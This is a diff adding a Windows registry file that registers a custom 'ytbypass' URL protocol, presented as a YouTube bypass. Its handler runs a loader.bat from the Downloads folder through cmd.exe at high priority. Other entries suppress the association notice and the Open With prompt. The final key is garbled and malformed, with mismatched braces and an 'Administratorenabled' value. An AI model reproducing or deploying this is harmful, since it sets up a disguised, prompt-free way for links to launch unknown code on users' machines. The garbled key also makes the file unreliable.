@@ -1,0 +1,24 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_CLASSES_ROOT\ytbypass]
+@="URL:YouTube Bypass Protocol"
+"URL Protocol"=""
+"NoOpenWith"=""
+
+[HKEY_CLASSES_ROOT\ytbypass\DefaultIcon]
+@="C:\\Windows\\System32\\cmd.exe,0"
+
+[HKEY_CLASSES_ROOT\ytbypass\shell]
+@="open"
+
+[HKEY_CLASSES_ROOT\ytbypass\shell\open]
+"EditFlags"=dword:00000002
+
+[HKEY_CLASSES_ROOT\ytbypass\shell\open\command]
+@="cmd.exe /c start \"\" /HIGH \"C:\\Users\\User\\Downloads\\loader.bat\""
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ApplicationAssociationToasts]
+"ytbypass=ytbypass"=dword:00000000
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\AttachmentExecute\\{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}}\\{command.com]
+"ytbypass"="Administratorenabled" 
